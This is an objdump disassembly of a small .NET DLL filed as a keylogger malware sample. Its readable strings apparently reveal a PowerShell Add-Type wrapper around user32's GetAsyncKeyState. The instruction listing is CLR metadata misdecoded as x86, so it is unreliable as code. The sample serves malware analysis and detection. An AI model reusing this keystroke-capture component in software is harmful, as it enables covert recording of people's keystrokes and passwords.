
malware_samples/keylogger/22bc84261294f6ff39ce079ac046fbdfc92cb5c4f8d2a4e09903221a04ce85eb.dll:     file format pei-i386


Disassembly of section .text:

10002000 <.text>:
10002000:	90                   	nop
10002001:	23 00                	and    (%eax),%eax
10002003:	00 00                	add    %al,(%eax)
10002005:	00 00                	add    %al,(%eax)
10002007:	00 48 00             	add    %cl,0x0(%eax)
1000200a:	00 00                	add    %al,(%eax)
1000200c:	02 00                	add    (%eax),%al
1000200e:	05 00 58 20 00       	add    $0x205800,%eax
10002013:	00 04 03             	add    %al,(%ebx,%eax,1)
10002016:	00 00                	add    %al,(%eax)
10002018:	01 00                	add    %eax,(%eax)
	...
1000204e:	00 00                	add    %al,(%eax)
10002050:	1e                   	push   %ds
10002051:	02 28                	add    (%eax),%ch
10002053:	04 00                	add    $0x0,%al
10002055:	00 0a                	add    %cl,(%edx)
10002057:	2a 42 53             	sub    0x53(%edx),%al
1000205a:	4a                   	dec    %edx
1000205b:	42                   	inc    %edx
1000205c:	01 00                	add    %eax,(%eax)
1000205e:	01 00                	add    %eax,(%eax)
10002060:	00 00                	add    %al,(%eax)
10002062:	00 00                	add    %al,(%eax)
10002064:	0c 00                	or     $0x0,%al
10002066:	00 00                	add    %al,(%eax)
10002068:	76 34                	jbe    0x1000209e
1000206a:	2e 30 2e             	xor    %ch,%cs:(%esi)
1000206d:	33 30                	xor    (%eax),%esi
1000206f:	33 31                	xor    (%ecx),%esi
10002071:	39 00                	cmp    %eax,(%eax)
10002073:	00 00                	add    %al,(%eax)
10002075:	00 05 00 6c 00 00    	add    %al,0x6c00
1000207b:	00 00                	add    %al,(%eax)
1000207d:	01 00                	add    %eax,(%eax)
1000207f:	00 23                	add    %ah,(%ebx)
10002081:	7e 00                	jle    0x10002083
10002083:	00 6c 01 00          	add    %ch,0x0(%ecx,%eax,1)
10002087:	00 38                	add    %bh,(%eax)
10002089:	01 00                	add    %eax,(%eax)
1000208b:	00 23                	add    %ah,(%ebx)
1000208d:	53                   	push   %ebx
1000208e:	74 72                	je     0x10002102
10002090:	69 6e 67 73 00 00 00 	imul   $0x73,0x67(%esi),%ebp
10002097:	00 a4 02 00 00 08 00 	add    %ah,0x80000(%edx,%eax,1)
1000209e:	00 00                	add    %al,(%eax)
100020a0:	23 55 53             	and    0x53(%ebp),%edx
100020a3:	00 ac 02 00 00 10 00 	add    %ch,0x100000(%edx,%eax,1)
100020aa:	00 00                	add    %al,(%eax)
100020ac:	23 47 55             	and    0x55(%edi),%eax
100020af:	49                   	dec    %ecx
100020b0:	44                   	inc    %esp
100020b1:	00 00                	add    %al,(%eax)
100020b3:	00 bc 02 00 00 48 00 	add    %bh,0x480000(%edx,%eax,1)
100020ba:	00 00                	add    %al,(%eax)
100020bc:	23 42 6c             	and    0x6c(%edx),%eax
100020bf:	6f                   	outsl  %ds:(%esi),(%dx)
100020c0:	62 00                	bound  %eax,(%eax)
100020c2:	00 00                	add    %al,(%eax)
100020c4:	00 00                	add    %al,(%eax)
100020c6:	00 00                	add    %al,(%eax)
100020c8:	02 00                	add    (%eax),%al
100020ca:	00 01                	add    %al,(%ecx)
100020cc:	47                   	inc    %edi
100020cd:	15 00 14 09 00       	adc    $0x91400,%eax
100020d2:	00 00                	add    %al,(%eax)
100020d4:	00 fa                	add    %bh,%dl
100020d6:	25 33 00 16 00       	and    $0x160033,%eax
100020db:	00 01                	add    %al,(%ecx)
100020dd:	00 00                	add    %al,(%eax)
100020df:	00 04 00             	add    %al,(%eax,%eax,1)
100020e2:	00 00                	add    %al,(%eax)
100020e4:	02 00                	add    (%eax),%al
100020e6:	00 00                	add    %al,(%eax)
100020e8:	02 00                	add    (%eax),%al
100020ea:	00 00                	add    %al,(%eax)
100020ec:	01 00                	add    %eax,(%eax)
100020ee:	00 00                	add    %al,(%eax)
100020f0:	04 00                	add    $0x0,%al
100020f2:	00 00                	add    %al,(%eax)
100020f4:	02 00                	add    (%eax),%al
100020f6:	00 00                	add    %al,(%eax)
100020f8:	01 00                	add    %eax,(%eax)
100020fa:	00 00                	add    %al,(%eax)
100020fc:	01 00                	add    %eax,(%eax)
100020fe:	00 00                	add    %al,(%eax)
10002100:	01 00                	add    %eax,(%eax)
10002102:	00 00                	add    %al,(%eax)
10002104:	01 00                	add    %eax,(%eax)
10002106:	00 00                	add    %al,(%eax)
10002108:	00 00                	add    %al,(%eax)
1000210a:	0a 00                	or     (%eax),%al
1000210c:	01 00                	add    %eax,(%eax)
1000210e:	00 00                	add    %al,(%eax)
10002110:	00 00                	add    %al,(%eax)
10002112:	06                   	push   %es
10002113:	00 6e 00             	add    %ch,0x0(%esi)
10002116:	67 00 06 00 b1       	add    %al,-0x4f00
1000211b:	00 91 00 06 00 d1    	add    %dl,-0x2efffa00(%ecx)
10002121:	00 91 00 06 00 17    	add    %dl,0x17000600(%ecx)
10002127:	01 f8                	add    %edi,%eax
10002129:	00 00                	add    %al,(%eax)
1000212b:	00 00                	add    %al,(%eax)
1000212d:	00 01                	add    %al,(%ecx)
1000212f:	00 00                	add    %al,(%eax)
10002131:	00 00                	add    %al,(%eax)
10002133:	00 01                	add    %al,(%ecx)
10002135:	00 01                	add    %al,(%ecx)
10002137:	00 01                	add    %al,(%ecx)
10002139:	00 10                	add    %dl,(%eax)
1000213b:	00 17                	add    %dl,(%edi)
1000213d:	00 25 00 05 00 01    	add    %ah,0x1000500
10002143:	00 01                	add    %al,(%ecx)
10002145:	00 00                	add    %al,(%eax)
10002147:	00 00                	add    %al,(%eax)
10002149:	00 80 00 96 20 75    	add    %al,0x75209600(%eax)
1000214f:	00 0a                	add    %cl,(%edx)
10002151:	00 01                	add    %al,(%ecx)
10002153:	00 50 20             	add    %dl,0x20(%eax)
10002156:	00 00                	add    %al,(%eax)
10002158:	00 00                	add    %al,(%eax)
1000215a:	86 18                	xchg   %bl,(%eax)
1000215c:	86 00                	xchg   %al,(%eax)
1000215e:	0f 00 02             	sldt   (%edx)
10002161:	00 00                	add    %al,(%eax)
10002163:	00 01                	add    %al,(%ecx)
10002165:	00 8c 00 11 00 86 00 	add    %cl,0x860011(%eax,%eax,1)
1000216c:	13 00                	adc    (%eax),%eax
1000216e:	19 00                	sbb    %eax,(%eax)
10002170:	86 00                	xchg   %al,(%eax)
10002172:	0f 00 21             	verr   (%ecx)
10002175:	00 86 00 18 00 09    	add    %al,0x9001800(%esi)
1000217b:	00 86 00 0f 00 2e    	add    %al,0x2e000f00(%esi)
10002181:	00 0b                	add    %cl,(%ebx)
10002183:	00 1d 00 2e 00 13    	add    %bl,0x13002e00
10002189:	00 26                	add    %ah,(%esi)
1000218b:	00 2a                	add    %ch,(%edx)
1000218d:	01 00                	add    %eax,(%eax)
1000218f:	01 03                	add    %eax,(%ebx)
10002191:	00 75 00             	add    %dh,0x0(%ebp)
10002194:	01 00                	add    %eax,(%eax)
10002196:	04 80                	add    $0x80,%al
	...
100021a8:	ef                   	out    %eax,(%dx)
100021a9:	00 00                	add    %al,(%eax)
100021ab:	00 04 00             	add    %al,(%eax,%eax,1)
	...
100021b6:	00 00                	add    %al,(%eax)
100021b8:	01 00                	add    %eax,(%eax)
100021ba:	5e                   	pop    %esi
	...
100021c3:	00 00                	add    %al,(%eax)
100021c5:	3c 4d                	cmp    $0x4d,%al
100021c7:	6f                   	outsl  %ds:(%esi),(%dx)
100021c8:	64 75 6c             	fs jne 0x10002237
100021cb:	65 3e 00 6b 66       	gs add %ch,%ds:0x66(%ebx)
100021d0:	30 6c 30 73          	xor    %ch,0x73(%eax,%esi,1)
100021d4:	61                   	popa
100021d5:	79 2e                	jns    0x10002205
100021d7:	64 6c                	fs insb (%dx),%es:(%edi)
100021d9:	6c                   	insb   (%dx),%es:(%edi)
100021da:	00 57 69             	add    %dl,0x69(%edi)
100021dd:	6e                   	outsb  %ds:(%esi),(%dx)
100021de:	33 32                	xor    (%edx),%esi
100021e0:	49                   	dec    %ecx
100021e1:	6e                   	outsb  %ds:(%esi),(%dx)
100021e2:	74 65                	je     0x10002249
100021e4:	72 6e                	jb     0x10002254
100021e6:	61                   	popa
100021e7:	6c                   	insb   (%dx),%es:(%edi)
100021e8:	00 4d 69             	add    %cl,0x69(%ebp)
100021eb:	63 72 6f             	arpl   %esi,0x6f(%edx)
100021ee:	73 6f                	jae    0x1000225f
100021f0:	66 74 2e             	data16 je 0x10002221
100021f3:	50                   	push   %eax
100021f4:	6f                   	outsl  %ds:(%esi),(%dx)
100021f5:	77 65                	ja     0x1000225c
100021f7:	72 53                	jb     0x1000224c
100021f9:	68 65 6c 6c 2e       	push   $0x2e6c6c65
100021fe:	43                   	inc    %ebx
100021ff:	6f                   	outsl  %ds:(%esi),(%dx)
10002200:	6d                   	insl   (%dx),%es:(%edi)
10002201:	6d                   	insl   (%dx),%es:(%edi)
10002202:	61                   	popa
10002203:	6e                   	outsb  %ds:(%esi),(%dx)
10002204:	64 73 2e             	fs jae 0x10002235
10002207:	41                   	inc    %ecx
10002208:	64 64 54             	fs fs push %esp
1000220b:	79 70                	jns    0x1000227d
1000220d:	65 2e 41             	gs cs inc %ecx
10002210:	75 74                	jne    0x10002286
10002212:	6f                   	outsl  %ds:(%esi),(%dx)
10002213:	47                   	inc    %edi
10002214:	65 6e                	outsb  %gs:(%esi),(%dx)
10002216:	65 72 61             	gs jb  0x1000227a
10002219:	74 65                	je     0x10002280
1000221b:	64 54                	fs push %esp
1000221d:	79 70                	jns    0x1000228f
1000221f:	65 73 00             	gs jae 0x10002222
10002222:	6d                   	insl   (%dx),%es:(%edi)
10002223:	73 63                	jae    0x10002288
10002225:	6f                   	outsl  %ds:(%esi),(%dx)
10002226:	72 6c                	jb     0x10002294
10002228:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
1000222f:	65 6d                	gs insl (%dx),%es:(%edi)
10002231:	00 4f 62             	add    %cl,0x62(%edi)
10002234:	6a 65                	push   $0x65
10002236:	63 74 00 47          	arpl   %esi,0x47(%eax,%eax,1)
1000223a:	65 74 41             	gs je  0x1000227e
1000223d:	73 79                	jae    0x100022b8
1000223f:	6e                   	outsb  %ds:(%esi),(%dx)
10002240:	63 4b 65             	arpl   %ecx,0x65(%ebx)
10002243:	79 53                	jns    0x10002298
10002245:	74 61                	je     0x100022a8
10002247:	74 65                	je     0x100022ae
10002249:	00 2e                	add    %ch,(%esi)
1000224b:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
1000224f:	00 76 4b             	add    %dh,0x4b(%esi)
10002252:	65 79 00             	gs jns 0x10002255
10002255:	53                   	push   %ebx
10002256:	79 73                	jns    0x100022cb
10002258:	74 65                	je     0x100022bf
1000225a:	6d                   	insl   (%dx),%es:(%edi)
1000225b:	2e 52                	cs push %edx
1000225d:	75 6e                	jne    0x100022cd
1000225f:	74 69                	je     0x100022ca
10002261:	6d                   	insl   (%dx),%es:(%edi)
10002262:	65 2e 43             	gs cs inc %ebx
10002265:	6f                   	outsl  %ds:(%esi),(%dx)
10002266:	6d                   	insl   (%dx),%es:(%edi)
10002267:	70 69                	jo     0x100022d2
10002269:	6c                   	insb   (%dx),%es:(%edi)
1000226a:	65 72 53             	gs jb  0x100022c0
1000226d:	65 72 76             	gs jb  0x100022e6
10002270:	69 63 65 73 00 43 6f 	imul   $0x6f430073,0x65(%ebx),%esp
10002277:	6d                   	insl   (%dx),%es:(%edi)
10002278:	70 69                	jo     0x100022e3
1000227a:	6c                   	insb   (%dx),%es:(%edi)
1000227b:	61                   	popa
1000227c:	74 69                	je     0x100022e7
1000227e:	6f                   	outsl  %ds:(%esi),(%dx)
1000227f:	6e                   	outsb  %ds:(%esi),(%dx)
10002280:	52                   	push   %edx
10002281:	65 6c                	gs insb (%dx),%es:(%edi)
10002283:	61                   	popa
10002284:	78 61                	js     0x100022e7
10002286:	74 69                	je     0x100022f1
10002288:	6f                   	outsl  %ds:(%esi),(%dx)
10002289:	6e                   	outsb  %ds:(%esi),(%dx)
1000228a:	73 41                	jae    0x100022cd
1000228c:	74 74                	je     0x10002302
1000228e:	72 69                	jb     0x100022f9
10002290:	62 75 74             	bound  %esi,0x74(%ebp)
10002293:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
10002297:	6e                   	outsb  %ds:(%esi),(%dx)
10002298:	74 69                	je     0x10002303
1000229a:	6d                   	insl   (%dx),%es:(%edi)
1000229b:	65 43                	gs inc %ebx
1000229d:	6f                   	outsl  %ds:(%esi),(%dx)
1000229e:	6d                   	insl   (%dx),%es:(%edi)
1000229f:	70 61                	jo     0x10002302
100022a1:	74 69                	je     0x1000230c
100022a3:	62 69 6c             	bound  %ebp,0x6c(%ecx)
100022a6:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
100022ad:	69 
100022ae:	62 75 74             	bound  %esi,0x74(%ebp)
100022b1:	65 00 6b 66          	add    %ch,%gs:0x66(%ebx)
100022b5:	30 6c 30 73          	xor    %ch,0x73(%eax,%esi,1)
100022b9:	61                   	popa
100022ba:	79 00                	jns    0x100022bc
100022bc:	53                   	push   %ebx
100022bd:	79 73                	jns    0x10002332
100022bf:	74 65                	je     0x10002326
100022c1:	6d                   	insl   (%dx),%es:(%edi)
100022c2:	2e 52                	cs push %edx
100022c4:	75 6e                	jne    0x10002334
100022c6:	74 69                	je     0x10002331
100022c8:	6d                   	insl   (%dx),%es:(%edi)
100022c9:	65 2e 49             	gs cs dec %ecx
100022cc:	6e                   	outsb  %ds:(%esi),(%dx)
100022cd:	74 65                	je     0x10002334
100022cf:	72 6f                	jb     0x10002340
100022d1:	70 53                	jo     0x10002326
100022d3:	65 72 76             	gs jb  0x1000234c
100022d6:	69 63 65 73 00 44 6c 	imul   $0x6c440073,0x65(%ebx),%esp
100022dd:	6c                   	insb   (%dx),%es:(%edi)
100022de:	49                   	dec    %ecx
100022df:	6d                   	insl   (%dx),%es:(%edi)
100022e0:	70 6f                	jo     0x10002351
100022e2:	72 74                	jb     0x10002358
100022e4:	41                   	inc    %ecx
100022e5:	74 74                	je     0x1000235b
100022e7:	72 69                	jb     0x10002352
100022e9:	62 75 74             	bound  %esi,0x74(%ebp)
100022ec:	65 00 75 73          	add    %dh,%gs:0x73(%ebp)
100022f0:	65 72 33             	gs jb  0x10002326
100022f3:	32 2e                	xor    (%esi),%ch
100022f5:	64 6c                	fs insb (%dx),%es:(%edi)
100022f7:	6c                   	insb   (%dx),%es:(%edi)
100022f8:	00 00                	add    %al,(%eax)
100022fa:	00 00                	add    %al,(%eax)
100022fc:	00 03                	add    %al,(%ebx)
100022fe:	20 00                	and    %al,(%eax)
10002300:	00 00                	add    %al,(%eax)
10002302:	00 00                	add    %al,(%eax)
10002304:	63 b4 bd 75 c0 ea 5d 	arpl   %esi,0x5deac075(%ebp,%edi,4)
1000230b:	42                   	inc    %edx
1000230c:	82 3c 1c ed          	cmpb   $0xed,(%esp,%ebx,1)
10002310:	df fe                	(bad)
10002312:	91                   	xchg   %eax,%ecx
10002313:	66 00 08             	data16 add %cl,(%eax)
10002316:	b7 7a                	mov    $0x7a,%bh
10002318:	5c                   	pop    %esp
10002319:	56                   	push   %esi
1000231a:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
1000231d:	89 04 00             	mov    %eax,(%eax,%eax,1)
10002320:	01 06                	add    %eax,(%esi)
10002322:	08 03                	or     %al,(%ebx)
10002324:	20 00                	and    %al,(%eax)
10002326:	01 04 20             	add    %eax,(%eax,%eiz,1)
10002329:	01 01                	add    %eax,(%ecx)
1000232b:	08 04 20             	or     %al,(%eax,%eiz,1)
1000232e:	01 01                	add    %eax,(%ecx)
10002330:	0e                   	push   %cs
10002331:	08 01                	or     %al,(%ecx)
10002333:	00 08                	add    %cl,(%eax)
10002335:	00 00                	add    %al,(%eax)
10002337:	00 00                	add    %al,(%eax)
10002339:	00 1e                	add    %bl,(%esi)
1000233b:	01 00                	add    %eax,(%eax)
1000233d:	01 00                	add    %eax,(%eax)
1000233f:	54                   	push   %esp
10002340:	02 16                	add    (%esi),%dl
10002342:	57                   	push   %edi
10002343:	72 61                	jb     0x100023a6
10002345:	70 4e                	jo     0x10002395
10002347:	6f                   	outsl  %ds:(%esi),(%dx)
10002348:	6e                   	outsb  %ds:(%esi),(%dx)
10002349:	45                   	inc    %ebp
1000234a:	78 63                	js     0x100023af
1000234c:	65 70 74             	gs jo  0x100023c3
1000234f:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
10002356:	77 73                	ja     0x100023cb
10002358:	01 00                	add    %eax,(%eax)
1000235a:	00 00                	add    %al,(%eax)
1000235c:	84 23                	test   %ah,(%ebx)
	...
10002366:	00 00                	add    %al,(%eax)
10002368:	9e                   	sahf
10002369:	23 00                	and    (%eax),%eax
1000236b:	00 00                	add    %al,(%eax)
1000236d:	20 00                	and    %al,(%eax)
	...
10002383:	00 90 23 00 00 00    	add    %dl,0x23(%eax)
	...
10002391:	00 5f 43             	add    %bl,0x43(%edi)
10002394:	6f                   	outsl  %ds:(%esi),(%dx)
10002395:	72 44                	jb     0x100023db
10002397:	6c                   	insb   (%dx),%es:(%edi)
10002398:	6c                   	insb   (%dx),%es:(%edi)
10002399:	4d                   	dec    %ebp
1000239a:	61                   	popa
1000239b:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
100023a2:	72 65                	jb     0x10002409
100023a4:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
100023a8:	6c                   	insb   (%dx),%es:(%edi)
100023a9:	00 00                	add    %al,(%eax)
100023ab:	00 00                	add    %al,(%eax)
100023ad:	00 ff                	add    %bh,%bh
100023af:	25 00 20 00 10       	and    $0x10002000,%eax
